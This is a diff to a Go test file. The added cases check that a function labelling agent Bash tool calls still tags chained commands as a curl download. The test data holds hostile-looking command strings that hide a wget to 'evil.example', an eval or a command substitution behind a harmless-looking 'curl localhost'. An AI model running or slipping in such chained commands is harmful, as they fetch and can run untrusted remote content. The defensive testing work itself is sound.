@@ -33,6 +33,16 @@ func TestLocalCurl(t *testing.T) {
 			t.Errorf("Of(%q) = %q, want a %s download", command, got, program)
 		}
 	}
+	// Beside a script Go does not read, a local curl keeps its label (Go
+	// only: the TS adapters read the script and name what it runs).
+	for _, command := range []string{
+		"curl http://localhost && bash -c 'wget https://evil.example'", `curl localhost; eval "$X"`,
+		"f() { wget https://evil.example; }; curl localhost && f", "curl localhost; echo $(wget -qO- https://evil.example)",
+	} {
+		if got := Of(call("Bash", "", command, ""), soul); got != "shell download: curl" {
+			t.Errorf("Of(%q) = %q, want a curl download", command, got)
+		}
+	}
 	// An unclosed quote is not vouched for (Go only: the TS words close it).
 	if got := Of(call("Bash", "", `curl "http://localhost`, ""), soul); got != "shell download: curl" {
 		t.Errorf("unclosed quote = %q, want a curl download", got)
